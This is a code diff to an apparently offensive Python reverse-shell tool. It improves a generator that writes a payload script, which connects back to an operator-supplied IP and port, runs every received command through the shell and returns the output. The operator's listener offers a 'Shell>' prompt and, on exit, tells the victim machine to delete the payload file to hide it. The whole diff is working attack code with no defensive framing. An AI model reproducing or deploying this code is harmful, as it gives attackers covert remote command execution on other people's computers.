@@ -17,7 +17,7 @@ def listen(ip, port):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind((ip, port))
         server.listen(1)
-        payload_name = input("What is the name of your payload (Without .py): ")
+        payload_name = input("What is the name of your payload: ")
         print(f"Listening on {ip}:{port}")
     except OSError as e:
         print(f"[!] Failed to start listener: {e}")
@@ -34,10 +34,9 @@ def listen(ip, port):
         while True:
             command = input("Shell> ")
             if command.lower() == "exit":
-                hide = "rm {payload_name}.py"
+                hide = "rm {payload_name}"
                 client_socket.send(hide.encode())
                 break
-
             client_socket.send(command.encode())
             response = client_socket.recv(6000).decode()
             print(response)
@@ -64,7 +63,7 @@ def option_check(choice):
                 file.write(f"""
 import socket
 import subprocess
-
+import os
 def connect_to_listener():
     server_ip = "{ip}"
     server_port = {port}
@@ -76,9 +75,17 @@ def connect_to_listener():
         command = client_socket.recv(1024).decode('utf-8')
         if command.lower() == 'exit':
             break
-        output = subprocess.run(command, shell=True, capture_output=True)
+        elif command.startswith('cd '):
+            path = command[3:].strip()
+            try:
+                os.chdir(path)
+                client_socket.send(f"Changed directory to {os.getcwd()}\n".encode())
+            except Exception as e:
+                client_socket.send(f"cd error: {e}\n".encode())
+            continue
+        output = subprocess.run(command, shell=True, capture_output=True, text=True)
         response = output.stdout + output.stderr
-        client_socket.send(response)
+        client_socket.send(response.encode())
         
     client_socket.close()
 
